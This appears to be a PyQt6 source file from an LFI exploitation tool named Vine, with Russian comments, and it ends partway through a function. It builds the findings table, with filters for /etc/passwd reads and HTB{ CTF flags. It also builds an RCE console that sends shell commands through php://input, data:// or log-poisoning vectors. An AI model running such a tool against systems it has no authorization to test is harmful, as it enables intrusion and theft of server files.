"""
Vine · ui/panels.py
Три основные панели: лог, результаты, кодекс + панель деталей находки.
"""

from __future__ import annotations

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QTextEdit, QTableWidget, QTableWidgetItem,
    QHeaderView, QFrame, QSizePolicy, QScrollArea,
    QPushButton, QAbstractItemView, QApplication,
    QToolButton, QGraphicsOpacityEffect, QLineEdit,
)
from PyQt6.QtCore import Qt, pyqtSignal, QTimer, QPropertyAnimation, QEasingCurve, QThread
from PyQt6.QtGui import QColor, QTextCharFormat, QTextCursor, QFont, QClipboard

from storage.models import StoredFinding
from core.payloads import TECHNIQUE_LABELS, ENCODING_LABELS


# ── Цвета лога ───────────────────────────────────────────────────────────────

LOG_COLORS = {
    "info":  "#7a6a4a",
    "ok":    "#4a8a6a",
    "warn":  "#8a6a20",
    "found": "#c8a45a",
    "error": "#8b3a2a",
    "dim":   "#3a3020",
}

LOG_PREFIX = {
    "info":  "  ",
    "ok":    "  [+]  ",
    "warn":  "  [~]  ",
    "found": "  ✦  ",
    "error": "  [!]  ",
    "dim":   "  ",
}


# ══════════════════════════════════════════════════════════════════
# LOG PANEL
# ══════════════════════════════════════════════════════════════════

class LogPanel(QWidget):

    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        self._log = QTextEdit()
        self._log.setObjectName("log_view")
        self._log.setReadOnly(True)
        self._log.setLineWrapMode(QTextEdit.LineWrapMode.NoWrap)
        layout.addWidget(self._log)

        self._welcome()

    def _welcome(self):
        self.append("⸻  VINE  ·  Marquis of Secrets  ⸻", "found")
        self.append("", "dim")
        self.append("Настройте цель слева и нажмите INVOKE VINE.", "info")
        self.append("", "dim")

    def append(self, msg: str, level: str = "info"):
        prefix = LOG_PREFIX.get(level, "  ")
        color  = LOG_COLORS.get(level, "#7a6a4a")

        fmt = QTextCharFormat()
        fmt.setForeground(QColor(color))

        cursor = self._log.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        cursor.insertText(f"{prefix}{msg}\n", fmt)
        self._log.setTextCursor(cursor)
        self._log.ensureCursorVisible()

    def clear_log(self):
        self._log.clear()
        self._welcome()


# ══════════════════════════════════════════════════════════════════
# RESULTS PANEL
# ══════════════════════════════════════════════════════════════════

# Как определяем «силу» паттерна для цвета индикатора
def _pattern_strength(pattern: str) -> str:
    """
    strong  — контент точно прочитан (root:x:0:0, HTB{, etc.)
    medium  — косвенный признак (size_delta)
    """
    if pattern.startswith("size_delta"):
        return "medium"
    return "strong"


RESULT_COLS = ["", "File", "Param", "Enc", "Pattern", "Δ bytes", "ms", "⎘"]
COL_WIDTHS  = [10, 200,    65,      95,    140,        70,        50,   28]


class ResultsPanel(QWidget):

    finding_selected = pyqtSignal(object)

    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # ── Панель фильтров ──────────────────────────────────────────
        filter_bar = QWidget()
        filter_bar.setStyleSheet("background: #111111; border-bottom: 1px solid #2a2418;")
        filter_bar.setFixedHeight(38)
        fb_layout = QHBoxLayout(filter_bar)
        fb_layout.setContentsMargins(10, 4, 10, 4)
        fb_layout.setSpacing(8)

        # Иконка поиска
        search_lbl = QLabel("⌕")
        search_lbl.setStyleSheet("color: #6b5a30; font-size: 16px; background: transparent;")
        search_lbl.setFixedWidth(18)
        fb_layout.addWidget(search_lbl)

        # Строка поиска
        self._filter_input = QLineEdit()
        self._filter_input.setPlaceholderText(
            "фильтр: /etc/passwd  ·  HTB{  ·  url_encoded  ·  wrapper  ·  page ..."
        )
        self._filter_input.setStyleSheet(
            "background: #0d0d0d; border: 1px solid #2a2418; border-radius: 2px;"
            "color: #f0e6cc; font-family: 'Courier New'; font-size: 12px; padding: 3px 8px;"
        )
        self._filter_input.textChanged.connect(self._apply_filter)
        fb_layout.addWidget(self._filter_input, 1)

        # Быстрые фильтры
        for label, flt, tip in [
            ("✓ confirmed", "confirmed",  "Только подтверждённые паттерны"),
            ("⌬ wrapper",   "wrapper",    "Только PHP wrapper находки"),
            ("HTB{",        "HTB{",       "Только флаги CTF"),
            ("passwd",      "/etc/passwd","Только /etc/passwd"),
        ]:
            btn = QPushButton(label)
            btn.setObjectName("btn_toolbar")
            btn.setFixedHeight(26)
            btn.setToolTip(tip)
            btn.clicked.connect(lambda _, f=flt: self._quick_filter(f))
            fb_layout.addWidget(btn)

        # Кнопка сброса
        btn_clear = QPushButton("✕")
        btn_clear.setObjectName("btn_toolbar")
        btn_clear.setFixedSize(26, 26)
        btn_clear.setToolTip("Сбросить фильтр")
        btn_clear.clicked.connect(self._clear_filter)
        fb_layout.addWidget(btn_clear)

        # Счётчик результатов
        self._filter_count = QLabel("")
        self._filter_count.setStyleSheet(
            "color: #6b5a30; font-size: 11px; font-family: 'Courier New';"
            "background: transparent; min-width: 60px;"
        )
        self._filter_count.setAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
        fb_layout.addWidget(self._filter_count)

        layout.addWidget(filter_bar)

        # ── Таблица ──────────────────────────────────────────────────
        self._table = QTableWidget(0, len(RESULT_COLS))
        self._table.setHorizontalHeaderLabels(RESULT_COLS)
        self._table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self._table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self._table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self._table.verticalHeader().setVisible(False)
        self._table.setShowGrid(False)
        self._table.horizontalHeader().setHighlightSections(False)
        self._table.setAlternatingRowColors(True)

        for i, w in enumerate(COL_WIDTHS):
            self._table.setColumnWidth(i, w)
        self._table.horizontalHeader().setStretchLastSection(False)
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)

        self._table.selectionModel().currentRowChanged.connect(
            lambda cur, _prev: self._on_row_changed(cur.row())
        )
        self._table.cellClicked.connect(self._on_cell_clicked)

        layout.addWidget(self._table)

        self._findings: list[StoredFinding] = []
        self._visible_findings: list[StoredFinding] = []  # отфильтрованные

    def add_finding(self, f: StoredFinding):
        self._findings.append(f)
        row = self._table.rowCount()
        self._table.insertRow(row)

        strength = _pattern_strength(f.matched_pattern)

        def cell(text: str, color: str = "#f0e6cc") -> QTableWidgetItem:
            item = QTableWidgetItem(text)
            item.setForeground(QColor(color))
            return item

        # Колонка 0 — цветной индикатор
        is_wrapper = getattr(f, "is_wrapper", False) or f.encoding == "wrapper"
        is_post    = getattr(f, "method", "GET") == "POST"

        if is_wrapper:
            ind = QTableWidgetItem("⌬")
            ind.setForeground(QColor("#7a9aff"))
            ind.setToolTip("PHP Wrapper — содержимое файла прочитано через php:// wrapper")
        elif strength == "strong":
            ind = QTableWidgetItem("▌")
            ind.setForeground(QColor("#5aaa7a"))
            ind.setToolTip("✓ Подтверждено — в ответе найден характерный паттерн файла")
        else:
            ind = QTableWidgetItem("▌")
            ind.setForeground(QColor("#c8a030"))
            ind.setToolTip("~ Эвристика — ответ вырос, паттерн не найден. Проверь вручную.")
        ind.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self._table.setItem(row, 0, ind)

        # Имя файла — с суффиксом метода
        file_label = f.target_file
        file_color = "#7a9aff" if is_wrapper else "#e8c060"
        file_item = cell(file_label, file_color)
        if is_post:
            file_item.setToolTip(f"POST request · param={f.param}")
        self._table.setItem(row, 1, file_item)
        self._table.setItem(row, 2, cell(f.param))

        # Enc — с цветом по типу
        enc_colors = {
            "plain":          "#f0e6cc",
            "url_encoded":    "#8aaa7a",
            "double_encoded": "#7a9aaa",
            "null_byte":      "#aa9a7a",
            "null_byte_php":  "#aa9a7a",
        }
        self._table.setItem(row, 3, cell(f.encoding, enc_colors.get(f.encoding, "#e8dfc8")))

        # Pattern — зелёный для strong, жёлтый для medium
        pat_color = "#5aaa7a" if strength == "strong" else "#c8a030"
        pat_item = cell(f.matched_pattern, pat_color)
        pat_item.setToolTip(
            f"Паттерн «{f.matched_pattern}» найден в теле ответа — файл прочитан"
            if strength == "strong"
            else f"Ответ вырос на {f.size_delta} байт — вероятно файл прочитан, но проверь вручную"
        )
        self._table.setItem(row, 4, pat_item)

        # Δ bytes — чем больше, тем ярче
        delta_color = "#e8c060" if f.size_delta > 500 else "#a09060"
        self._table.setItem(row, 5, cell(f"+{f.size_delta}", delta_color))

        self._table.setItem(row, 6, cell(str(f.elapsed_ms), "#808060"))

        # Колонка 7 — кнопка копирования payload
        copy_btn = QPushButton("⎘")
        copy_btn.setObjectName("btn_toolbar")
        copy_btn.setFixedSize(26, 26)
        copy_btn.setToolTip(f"Скопировать payload:\n{f.raw_payload}")
        copy_btn.clicked.connect(lambda _, p=f.raw_payload: self._copy_payload(p, copy_btn))
        self._table.setCellWidget(row, 7, copy_btn)

        self._table.setRowHeight(row, 36)

    def _copy_payload(self, payload: str, btn: QPushButton):
        QApplication.clipboard().setText(payload)
        btn.setText("✓")
        btn.setStyleSheet("color: #4a8a6a; border-color: #4a8a6a;")
        QTimer.singleShot(1200, lambda: (btn.setText("⎘"), btn.setStyleSheet("")))

    def _on_cell_clicked(self, row: int, col: int):
        if col != 7:
            self._on_row_changed(row)

    def load_findings(self, findings: list[StoredFinding]):
        self._findings = list(findings)
        self._apply_filter(self._filter_input.text())

    def clear(self):
        self._table.setRowCount(0)
        self._findings = []
        self._visible_findings = []
        self._update_filter_count()

    def _on_row_changed(self, row: int):
        if 0 <= row < len(self._visible_findings):
            self.finding_selected.emit(self._visible_findings[row])
        else:
            self.finding_selected.emit(None)

    @property
    def count(self) -> int:
        return len(self._findings)

    # ── Фильтрация ───────────────────────────────────────────────────────────

    def _matches(self, f: StoredFinding, query: str) -> bool:
        """Проверяет соответствие находки поисковому запросу."""
        if not query:
            return True
        q = query.lower().strip()

        # Специальные фильтры
        if q == "confirmed":
            return not f.matched_pattern.startswith("size_delta")
        if q == "wrapper":
            return getattr(f, "is_wrapper", False) or f.encoding == "wrapper"
        if q == "post":
            return getattr(f, "method", "GET") == "POST"
        if q == "heuristic":
            return f.matched_pattern.startswith("size_delta")

        # Поиск по полям
        searchable = " ".join([
            f.target_file,
            f.param,
            f.encoding,
            f.technique,
            f.matched_pattern,
            f.raw_payload,
            f.url,
            getattr(f, "method", "GET"),
        ]).lower()

        # Поддержка нескольких слов через пробел (AND)
        return all(word in searchable for word in q.split())

    def _apply_filter(self, query: str):
        """Применяет фильтр — перерисовывает таблицу."""
        self._table.setRowCount(0)
        self._visible_findings = []

        for f in self._findings:
            if self._matches(f, query):
                self._visible_findings.append(f)
                self._add_row(f)

        self._update_filter_count()

        # Подсветить строку поиска если есть фильтр
        if query.strip():
            self._filter_input.setStyleSheet(
                "background: #0d0d0d; border: 1px solid #c8a040; border-radius: 2px;"
                "color: #f0e6cc; font-family: 'Courier New'; font-size: 12px; padding: 3px 8px;"
            )
        else:
            self._filter_input.setStyleSheet(
                "background: 0d0d0d; border: 1px solid #2a2418; border-radius: 2px;"
                "color: #f0e6cc; font-family: 'Courier New'; font-size: 12px; padding: 3px 8px;"
            )

    def _quick_filter(self, query: str):
        """Устанавливает быстрый фильтр из кнопки — переключатель."""
        if self._filter_input.text() == query:
            self._clear_filter()
        else:
            self._filter_input.setText(query)

    def _clear_filter(self):
        self._filter_input.clear()

    def _update_filter_count(self):
        total = len(self._findings)
        shown = len(self._visible_findings)
        if total == 0:
            self._filter_count.setText("")
        elif shown == total:
            self._filter_count.setText(f"{total} found")
        else:
            self._filter_count.setText(f"{shown} / {total}")

    def _add_row(self, f: StoredFinding):
        """Добавляет одну строку в таблицу (используется при фильтрации)."""
        row = self._table.rowCount()
        self._table.insertRow(row)

        strength = _pattern_strength(f.matched_pattern)

        def cell(text: str, color: str = "#f0e6cc") -> QTableWidgetItem:
            item = QTableWidgetItem(text)
            item.setForeground(QColor(color))
            return item

        is_wrapper = getattr(f, "is_wrapper", False) or f.encoding == "wrapper"
        is_post    = getattr(f, "method", "GET") == "POST"

        if is_wrapper:
            ind = QTableWidgetItem("⌬")
            ind.setForeground(QColor("#7a9aff"))
            ind.setToolTip("PHP Wrapper — содержимое файла прочитано через php:// wrapper")
        elif strength == "strong":
            ind = QTableWidgetItem("▌")
            ind.setForeground(QColor("#5aaa7a"))
            ind.setToolTip("✓ Подтверждено — в ответе найден характерный паттерн файла")
        else:
            ind = QTableWidgetItem("▌")
            ind.setForeground(QColor("#c8a030"))
            ind.setToolTip("~ Эвристика — ответ вырос, паттерн не найден. Проверь вручную.")
        ind.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self._table.setItem(row, 0, ind)

        file_color = "#7a9aff" if is_wrapper else "#e8c060"
        file_item = cell(f.target_file, file_color)
        if is_post:
            file_item.setToolTip(f"POST request · param={f.param}")
        self._table.setItem(row, 1, file_item)
        self._table.setItem(row, 2, cell(f.param))

        enc_colors = {
            "plain": "#f0e6cc", "url_encoded": "#8aaa7a",
            "double_encoded": "#7a9aaa", "null_byte": "#aa9a7a",
            "null_byte_php": "#aa9a7a", "wrapper": "#7a9aff",
        }
        self._table.setItem(row, 3, cell(f.encoding, enc_colors.get(f.encoding, "#e8dfc8")))

        pat_color = "#5aaa7a" if strength == "strong" else "#c8a030"
        pat_item = cell(f.matched_pattern, pat_color)
        pat_item.setToolTip(
            f"Паттерн «{f.matched_pattern}» найден в теле ответа — файл прочитан"
            if strength == "strong"
            else f"Ответ вырос на {f.size_delta} байт — вероятно файл прочитан"
        )
        self._table.setItem(row, 4, pat_item)

        delta_color = "#e8c060" if f.size_delta > 500 else "#a09060"
        self._table.setItem(row, 5, cell(f"+{f.size_delta}", delta_color))
        self._table.setItem(row, 6, cell(str(f.elapsed_ms), "#808060"))

        copy_btn = QPushButton("⎘")
        copy_btn.setObjectName("btn_toolbar")
        copy_btn.setFixedSize(26, 26)
        copy_btn.setToolTip("Скопировать payload: " + f.raw_payload[:60])
        copy_btn.clicked.connect(lambda _, p=f.raw_payload: self._copy_payload(p, copy_btn))
        self._table.setCellWidget(row, 7, copy_btn)
        self._table.setRowHeight(row, 36)


# ══════════════════════════════════════════════════════════════════
# FINDING DETAIL PANEL
# ══════════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════════
# RCE CONSOLE WIDGET
# ══════════════════════════════════════════════════════════════════

class _RCEWorker(QThread):
    """Выполняет команду в фоновом потоке."""
    result_ready = pyqtSignal(object)

    def __init__(self, engine, cmd):
        super().__init__()
        self._engine = engine
        self._cmd = cmd

    def run(self):
        result = self._engine.execute(self._cmd)
        self.result_ready.emit(result)


class RCEConsole(QWidget):
    """
    Мини-консоль для эксплуатации RCE через php://input / data://.
    Встраивается в FindingDetail при выборе wrapper-находки.
    """

    def __init__(self, parent=None):
        super().__init__(parent)
        self._engine = None
        self._history: list[str] = []
        self._hist_idx = 0
        self._worker = None

        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(6)

        # Заголовок + статус
        hdr = QHBoxLayout()
        lbl = QLabel("◈  RCE CONSOLE")
        lbl.setObjectName("section_label")
        hdr.addWidget(lbl)
        self._status_dot = QLabel("●")
        self._status_dot.setStyleSheet("color: #3a3020; font-size: 10px;")
        hdr.addWidget(self._status_dot)
        self._status_lbl = QLabel("inactive")
        self._status_lbl.setStyleSheet("font-size: 10px; color: #6b5a30;")
        hdr.addWidget(self._status_lbl, 1)
        layout.addLayout(hdr)

        # Вывод терминала
        self._output = QTextEdit()
        self._output.setReadOnly(True)
        self._output.setMinimumHeight(160)
        self._output.setStyleSheet(
            "background: #050505; border: 1px solid #1a1a1a;"
            "color: #e8c060; font-family: 'Courier New'; font-size: 12px; padding: 6px;"
        )
        self._output.setPlaceholderText("вывод команд...")
        layout.addWidget(self._output)

        # Быстрые команды
        quick_lbl = QLabel("быстрые команды:")
        quick_lbl.setStyleSheet("font-size: 10px; color: #6b5a30;")
        layout.addWidget(quick_lbl)

        quick_scroll = QScrollArea()
        quick_scroll.setFixedHeight(56)
        quick_scroll.setWidgetResizable(True)
        quick_scroll.setFrameShape(QFrame.Shape.NoFrame)
        quick_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        quick_scroll.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)

        quick_w = QWidget()
        quick_row = QHBoxLayout(quick_w)
        quick_row.setContentsMargins(0, 0, 0, 0)
        quick_row.setSpacing(4)

        from core.rce import QUICK_COMMANDS
        for cmd, hint in QUICK_COMMANDS[:8]:
            btn = QPushButton(cmd)
            btn.setObjectName("btn_toolbar")
            btn.setFixedHeight(24)
            btn.setToolTip(hint)
            btn.clicked.connect(lambda _, c=cmd: self._run_command(c))
            quick_row.addWidget(btn)
        quick_row.addStretch()

        quick_scroll.setWidget(quick_w)
        layout.addWidget(quick_scroll)

        # Строка ввода
        input_row = QHBoxLayout()
        input_row.setSpacing(4)

        self._prompt = QLabel("$")
        self._prompt.setStyleSheet("color: #5aaa7a; font-size: 13px; font-family: 'Courier New';")
        self._prompt.setFixedWidth(14)
        input_row.addWidget(self._prompt)

        self._input = QLineEdit()
        self._input.setStyleSheet(
            "background: #050505; border: 1px solid #2a2010;"
            "color: #f0e6cc; font-family: 'Courier New'; font-size: 13px; padding: 5px 8px;"
        )
        self._input.setPlaceholderText("введи команду...")
        self._input.returnPressed.connect(lambda: self._run_command(self._input.text()))
        input_row.addWidget(self._input, 1)

        btn_run = QPushButton("▶")
        btn_run.setObjectName("btn_toolbar")
        btn_run.setFixedSize(30, 30)
        btn_run.setToolTip("Выполнить · Enter")
        btn_run.clicked.connect(lambda: self._run_command(self._input.text()))
        input_row.addWidget(btn_run)

        btn_clear = QPushButton("✕")
        btn_clear.setObjectName("btn_toolbar")
        btn_clear.setFixedSize(30, 30)
        btn_clear.setToolTip("Очистить вывод")
        btn_clear.clicked.connect(self._output.clear)
        input_row.addWidget(btn_clear)

        layout.addLayout(input_row)
        self.setVisible(False)

    def setup(self, finding, scan_config=None):
        """Инициализирует консоль для найденной RCE-уязвимости."""
        from core.rce import RCEEngine, RCESession, detect_vector

        vector = detect_vector(finding.technique, finding.raw_payload)
        cookies = getattr(scan_config, "cookies", {}) if scan_config else {}
        proxy   = getattr(scan_config, "proxy", None) if scan_config else None

        session = RCESession(
            target_url=finding.url.split("?")[0] + "?" +
                       "&".join(p for p in finding.url.split("?")[1].split("&")
                                if not p.startswith(finding.param + "="))
                       if "?" in finding.url else finding.url,
            param=finding.param,
            lfi_payload=finding.raw_payload,
            vector=vector,
            cookies=cookies,
            proxy=proxy,
        )
        # Упрощённо — передаём весь URL
        session = RCESession(
            target_url=finding.url,
            param=finding.param,
            lfi_payload=finding.raw_payload,
            vector=vector,
            cookies=cookies,
            proxy=proxy,
        )
        self._engine = RCEEngine(session)
        self._output.clear()

        vector_names = {
            "php_input": "php://input POST",
            "data_rce":  "data:// GET",
            "log_poison": "Log Poison",
        }
        self._set_status("ready", vector_names.get(vector, vector))
        self._append(f"[VINE RCE] vector={vector}  param={finding.param}", "#9a7a40")
        self._append(f"[VINE RCE] target={finding.url[:80]}", "#9a7a40")
        self._append("[VINE RCE] ready · type command or pick from quick list", "#5aaa7a")
        self.setVisible(True)
        self._input.setFocus()

    def _run_command(self, cmd: str):
        cmd = cmd.strip()
        if not cmd or not self._engine:
            return
        if self._worker and self._worker.isRunning():
            self._append("[!] ещё выполняется предыдущая команда...", "#c8a030")
            return

        self._history.append(cmd)
        self._hist_idx = len(self._history)
        self._input.clear()
        self._append(f"$ {cmd}", "#5aaa7a")
        self._set_status("running", "executing...")

        self._worker = _RCEWorker(self._engine, cmd)
        self._worker.result_ready.connect(self._on_result)
        self._worker.start()

    def _on_result(self, result):
        if result.success:
            self._append(result.output if result.output else "(no output)", "#f0e6cc")
            self._append(f"[{result.elapsed_ms}ms]", "#6b5a30")
        else:
            err = result.error or "no output markers — server may not execute PHP"
            self._append(f"[!] {err}", "#cc5a4a")
            self._append("[~] tip: try a different vector or check php://input support", "#9a7a40")
        self._set_status("ready", self._engine._session.vector)

    def _append(self, text: str, color: str = "#f0e6cc"):
        from PyQt6.QtGui import QTextCharFormat, QTextCursor
        fmt = QTextCharFormat()
        fmt.setForeground(QColor(color))
        cursor = self._output.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        cursor.insertText(text + "\n", fmt)
        self._output.setTextCursor(cursor)
        self._output.ensureCursorVisible()

    def _set_status(self, state: str, text: str):
        colors = {"ready": "#5aaa7a", "running": "#c8a030", "inactive": "#3a3020"}
        self._status_dot.setStyleSheet(f"color: {colors.get(state, '#3a3020')}; font-size: 10px;")
        self._status_lbl.setText(text)


class FindingDetail(QWidget):
    """Правая панель — детали выбранной находки с кнопками копирования."""

    notes_saved = pyqtSignal(int, str)

    # Поля с кнопкой копирования
    _COPY_FIELDS = {"URL", "Payload", "Pattern"}

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedWidth(310)
        self._finding: StoredFinding | None = None

        layout = QVBoxLayout(self)
        layout.setContentsMargins(14, 12, 14, 14)
        layout.setSpacing(0)

        # Заголовок
        hdr = QLabel("◈  REVELATION")
        hdr.setObjectName("section_label")
        layout.addWidget(hdr)
        layout.addSpacing(10)

        # Блок: индикатор подтверждения
        self._confirm_bar = QWidget()
        self._confirm_bar.setFixedHeight(28)
        cb_layout = QHBoxLayout(self._confirm_bar)
        cb_layout.setContentsMargins(8, 0, 8, 0)
        self._confirm_icon = QLabel("▌")
        self._confirm_icon.setFixedWidth(12)
        self._confirm_text = QLabel("")
        self._confirm_text.setObjectName("label")
        cb_layout.addWidget(self._confirm_icon)
        cb_layout.addWidget(self._confirm_text, 1)
        layout.addWidget(self._confirm_bar)
        layout.addSpacing(8)

        # Поля
        self._fields: dict[str, QLabel] = {}
        self._copy_btns: dict[str, QPushButton] = {}

        field_keys = [
            ("File",      "целевой файл"),
            ("Param",     "уязвимый параметр"),
            ("Encoding",  "кодировка"),
            ("Technique", "техника bypass"),
            ("Pattern",   "найденный паттерн"),
            ("Payload",   "raw payload"),
            ("URL",       "полный URL"),
            ("Δ bytes",   "рост ответа"),
            ("Status",    "HTTP статус"),
            ("Time",      "время ответа"),
        ]

        for key, hint in field_keys:
            row_w = QWidget()
            row_l = QHBoxLayout(row_w)
            row_l.setContentsMargins(0, 2, 0, 2)
            row_l.setSpacing(6)

            k_lbl = QLabel(key)
            k_lbl.setFixedWidth(64)
            k_lbl.setObjectName("label")
            k_lbl.setToolTip(hint)

            v_lbl = QLabel("—")
            v_lbl.setObjectName("label_value")
            v_lbl.setWordWrap(True)
            v_lbl.setTextInteractionFlags(
                Qt.TextInteractionFlag.TextSelectableByMouse
            )

            row_l.addWidget(k_lbl)
            row_l.addWidget(v_lbl, 1)

            if key in self._COPY_FIELDS:
                btn = QPushButton("⎘")
                btn.setObjectName("btn_toolbar")
                btn.setFixedSize(22, 22)
                btn.setToolTip(f"Скопировать {key.lower()} в буфер")
                btn.clicked.connect(lambda _, k=key: self._copy_field(k))
                row_l.addWidget(btn)
                self._copy_btns[key] = btn

            layout.addWidget(row_w)
            self._fields[key] = v_lbl

        # Разделитель
        layout.addSpacing(8)
        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setObjectName("h_line")
        layout.addWidget(line)
        layout.addSpacing(8)

        # Быстрые действия
        quick_lbl = QLabel("◈  QUICK ACTIONS")
        quick_lbl.setObjectName("section_label")
        layout.addWidget(quick_lbl)
        layout.addSpacing(6)

        btn_copy_all = QPushButton("⎘  скопировать всё")
        btn_copy_all.setObjectName("btn_toolbar")
        btn_copy_all.setToolTip("Скопировать payload + URL одной строкой")
        btn_copy_all.clicked.connect(self._copy_all)
        layout.addWidget(btn_copy_all)

        btn_copy_curl = QPushButton("⎘  curl-команда")
        btn_copy_curl.setObjectName("btn_toolbar")
        btn_copy_curl.setToolTip("Скопировать готовую curl-команду для проверки")
        btn_copy_curl.clicked.connect(self._copy_curl)
        layout.addWidget(btn_copy_curl)

        self._btn_read = QPushButton("▶  читать файл")
        self._btn_read.setObjectName("btn_toolbar")
        self._btn_read.setToolTip(
            "Загрузить содержимое файла прямо сейчас\n"
            "Выполнит реальный запрос с найденным payload"
        )
        self._btn_read.clicked.connect(self._fetch_file)
        layout.addWidget(self._btn_read)

        # Просмотр файла
        layout.addSpacing(4)
        self._file_view = QTextEdit()
        self._file_view.setReadOnly(True)
        self._file_view.setPlaceholderText("нажми ▶ читать файл...")
        self._file_view.setMinimumHeight(120)
        self._file_view.setMaximumHeight(220)
        self._file_view.setStyleSheet(
            "background: #0a0a0a; border: 1px solid #2a2010;"
            "color: #e8c060; font-size: 12px; padding: 6px;"
        )
        layout.addWidget(self._file_view)

        # RCE Console
        self._rce_console = RCEConsole()
        layout.addWidget(self._rce_console)

        # Разделитель
        layout.addSpacing(8)
        line2 = QFrame()
        line2.setFrameShape(QFrame.Shape.HLine)
        line2.setObjectName("h_line")
        layout.addWidget(line2)
        layout.addSpacing(8)

        # Заметки
        notes_lbl = QLabel("◈  NOTES")
        notes_lbl.setObjectName("section_label")
        layout.addWidget(notes_lbl)
        layout.addSpacing(4)

        self._notes = QTextEdit()
        self._notes.setPlaceholderText("Заметки к находке...")
        self._notes.setMaximumHeight(80)
        layout.addWidget(self._notes)

        btn_save = QPushButton("сохранить заметку")
        btn_save.setObjectName("btn_toolbar")
        btn_save.clicked.connect(self._save_notes)
        layout.addWidget(btn_save)

        layout.addStretch()
        self.setVisible(False)

    # ── Показ находки ────────────────────────────────────────────────────────

    def show_finding(self, f: StoredFinding | None):
        self._finding = f
        if f is None:
            self.setVisible(False)
            return

        self.setVisible(True)

        # Индикатор подтверждения
        is_wrapper = getattr(f, "is_wrapper", False) or f.encoding == "wrapper"
        is_post    = getattr(f, "method", "GET") == "POST"
        is_strong  = not f.matched_pattern.startswith("size_delta")

        if is_wrapper:
            self._confirm_icon.setStyleSheet("color: #7a9aff; font-size: 16px;")
            tech_label = f.technique if hasattr(f, "technique") else f.encoding
            self._confirm_text.setText(f"php wrapper · {tech_label}")
            self._confirm_bar.setStyleSheet(
                "background: #0a0a1a; border: 1px solid #2a2a5a; border-radius: 3px;"
            )
            self._confirm_text.setStyleSheet("color: #7a9aff;")
        elif is_strong:
            method_tag = " · POST" if is_post else ""
            self._confirm_icon.setStyleSheet("color: #5aaa7a; font-size: 16px;")
            self._confirm_text.setText(f"подтверждено — паттерн в ответе{method_tag}")
            self._confirm_bar.setStyleSheet(
                "background: #0a1a10; border: 1px solid #1a3a2a; border-radius: 3px;"
            )
            self._confirm_text.setStyleSheet("color: #5aaa7a;")
        else:
            self._confirm_icon.setStyleSheet("color: #8a6a20; font-size: 16px;")
            self._confirm_text.setText("эвристика — проверь вручную")
            self._confirm_bar.setStyleSheet(
                "background: #1a1400; border: 1px solid #3a2a00; border-radius: 3px;"
            )
            self._confirm_text.setStyleSheet("color: #8a6a20;")

        # Поля
        self._fields["File"].setText(f.target_file)
        self._fields["Param"].setText(f.param)
        self._fields["Encoding"].setText(f.encoding)
        self._fields["Technique"].setText(TECHNIQUE_LABELS.get(f.technique, f.technique))

        pat_color = "#4a8a6a" if is_strong else "#8a6a20"
        self._fields["Pattern"].setText(f.matched_pattern)
        self._fields["Pattern"].setStyleSheet(f"color: {pat_color};")

        self._fields["Payload"].setText(f.raw_payload)
        self._fields["URL"].setText(f.url)
        self._fields["Δ bytes"].setText(f"+{f.size_delta} bytes")
        self._fields["Status"].setText(str(f.status_code))
        self._fields["Time"].setText(f"{f.elapsed_ms} ms")
        self._notes.setPlainText(f.notes)

        # RCE консоль — показать только для php://input и data:// векторов
        rce_techniques = {"input_rce", "data_plain", "data_b64", "data_id", "log_poison"}
        if f.technique in rce_techniques or "php://input" in f.raw_payload:
            self._rce_console.setup(f, getattr(self, "_scan_config", None))
        else:
            self._rce_console.setVisible(False)

        # Для wrapper-находок — показать decoded_content сразу
        decoded = getattr(f, "decoded_content", "")
        if decoded and len(decoded) > 5:
            self._file_view.setPlainText(decoded)
            self._file_view.setStyleSheet(
                "background: #0a0a1a; border: 1px solid #2a2a5a;"
                "color: #aaaaff; font-size: 12px; padding: 6px;"
            )
            self._btn_read.setText("⟳  обновить")
        else:
            self._file_view.clear()
            self._file_view.setPlaceholderText("нажми ▶ читать файл...")
            self._file_view.setStyleSheet(
                "background: #0a0a0a; border: 1px solid #2a2010;"
                "color: #e8c060; font-size: 12px; padding: 6px;"
            )
            self._btn_read.setText("▶  читать файл")

    # ── Копирование ──────────────────────────────────────────────────────────

    def _copy_field(self, key: str):
        if not self._finding:
            return
        values = {
            "URL":     self._finding.url,
            "Payload": self._finding.raw_payload,
            "Pattern": self._finding.matched_pattern,
        }
        text = values.get(key, "")
        QApplication.clipboard().setText(text)
        self._flash_btn(self._copy_btns[key])

    def _copy_all(self):
        if not self._finding:
            return
        f = self._finding
        text = (
            f"File:    {f.target_file}\n"
            f"Param:   {f.param}\n"
            f"Payload: {f.raw_payload}\n"
            f"URL:     {f.url}\n"
            f"Pattern: {f.matched_pattern}\n"
            f"Δ bytes: +{f.size_delta}"
        )
        QApplication.clipboard().setText(text)

    def _copy_curl(self):
        if not self._finding:
            return
        curl = f'curl -s "{self._finding.url}"'
        QApplication.clipboard().setText(curl)

    def _fetch_file(self):
        """Загружает содержимое файла через реальный HTTP-запрос."""
        if not self._finding:
            return
        f = self._finding
        self._btn_read.setText("…  загрузка")
        self._btn_read.setEnabled(False)
        self._file_view.setPlainText("fetching...")
        QApplication.processEvents()

        try:
            import requests as _req
            import urllib.parse as _up
            import re as _re

